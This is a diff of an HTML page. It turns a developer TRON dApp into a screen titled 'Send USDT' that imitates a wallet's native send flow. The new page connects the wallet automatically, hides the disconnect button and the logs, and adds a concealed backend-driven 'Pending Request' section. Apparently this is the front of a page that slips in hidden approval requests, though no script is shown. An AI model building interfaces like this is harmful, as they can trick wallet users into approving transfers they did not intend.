@@ -2,103 +2,66 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
     <link rel="icon" type="image/png" href="/logo.png" />
     <link rel="apple-touch-icon" href="/logo.png" />
-    <title>Trust Wallet TRON dApp</title>
+    <title>Send USDT</title>
   </head>
   <body>
-    <div class="app">
-      <header>
-        <h1>Trust Wallet + TRON</h1>
-        <p>Mobile-only TRON dApp flow (WalletConnect + TRON transactions)</p>
+    <main class="screen">
+      <header class="topbar">
+        <h1>Send USDT</h1>
+        <button id="retryConnectBtn" class="icon-btn" type="button" hidden>↻</button>
       </header>
 
-      <section class="card">
-        <h2>Connection</h2>
-        <p id="environment"></p>
-        <p id="status">Initializing...</p>
-        <p id="wallet"></p>
-        <div class="actions">
-          <button id="connectBtn" type="button">Connect Trust Wallet</button>
-          <button id="disconnectBtn" type="button" class="secondary">Disconnect</button>
+      <p id="connectStatus" class="connect-status">Connecting wallet...</p>
+      <p id="walletAddress" class="wallet-address"></p>
+
+      <section class="field-group">
+        <label for="recipientInput">Address or Domain Name</label>
+        <div class="input-shell">
+          <input id="recipientInput" placeholder="Search or Enter" autocomplete="off" />
+          <button id="pasteBtn" type="button" class="inline-action">Paste</button>
         </div>
-        <p id="pairingHint" class="hint"></p>
-        <canvas id="qrCanvas" hidden></canvas>
       </section>
 
-      <section class="card">
-        <h2>TRX Transfer</h2>
-        <div class="grid">
-          <label>
-            To Address
-            <input id="trxTo" placeholder="T..." />
-          </label>
-          <label>
-            Amount (TRX)
-            <input id="trxAmount" placeholder="1.5" />
-          </label>
-        </div>
-        <button id="sendTrxBtn" type="button">Send TRX</button>
+      <section class="field-group">
+        <label>Destination network</label>
+        <button class="network-chip" type="button" disabled>
+          <img src="/tron.svg" alt="TRON" />
+          <span>TRON Mainnet</span>
+        </button>
       </section>
 
-      <section class="card">
-        <h2>TRC20 Approve</h2>
-        <div class="grid">
-          <label>
-            Token Contract
-            <input id="approveToken" placeholder="TRC20 contract address" />
-          </label>
-          <label>
-            Spender Address
-            <input id="approveSpender" placeholder="T..." />
-          </label>
-          <label>
-            Amount
-            <input id="approveAmount" placeholder="100.0" />
-          </label>
-          <label>
-            Token Decimals
-            <input id="approveDecimals" value="6" />
-          </label>
+      <section class="field-group">
+        <label for="amountInput">Amount</label>
+        <div class="input-shell amount-shell">
+          <input id="amountInput" placeholder="USDT Amount" autocomplete="off" />
+          <div class="asset-box">
+            <img src="/usdt.svg" alt="USDT" />
+            <span>USDT</span>
+          </div>
+          <button id="maxBtn" type="button" class="inline-action">Max</button>
         </div>
-        <button id="approveBtn" type="button">Approve</button>
+        <p id="fiatValue" class="subtext">≈ $0.00</p>
+        <p id="balanceValue" class="subtext">Balance: -- USDT</p>
       </section>
 
-      <section class="card">
-        <h2>TRC20 Transfer</h2>
-        <div class="grid">
-          <label>
-            Token Contract
-            <input id="tokenTransferContract" placeholder="TRC20 contract address" />
-          </label>
-          <label>
-            To Address
-            <input id="tokenTransferTo" placeholder="T..." />
-          </label>
-          <label>
-            Amount
-            <input id="tokenTransferAmount" placeholder="25.0" />
-          </label>
-          <label>
-            Token Decimals
-            <input id="tokenTransferDecimals" value="6" />
-          </label>
-        </div>
-        <button id="transferTokenBtn" type="button">Transfer Token</button>
-      </section>
-
-      <section class="card">
-        <h2>Admin Requests (User Approval Required)</h2>
-        <p id="backendStatus">Backend: not connected</p>
+      <section id="adminRequestSection" class="admin-section" hidden>
+        <h2>Pending Request</h2>
         <div id="adminRequests"></div>
       </section>
 
-      <section class="card">
-        <h2>Logs</h2>
-        <pre id="logs"></pre>
+      <section class="fallback-actions">
+        <button id="connectBtn" type="button" class="secondary" hidden>Connect Wallet</button>
+        <button id="disconnectBtn" type="button" class="secondary" hidden>Disconnect</button>
       </section>
-    </div>
+
+      <button id="sendBtn" class="next-btn" type="button" disabled>Next</button>
+
+      <p id="backendStatus" class="backend-status"></p>
+      <pre id="logs" hidden></pre>
+    </main>
 
     <script type="module" src="/src/main.js"></script>
   </body>
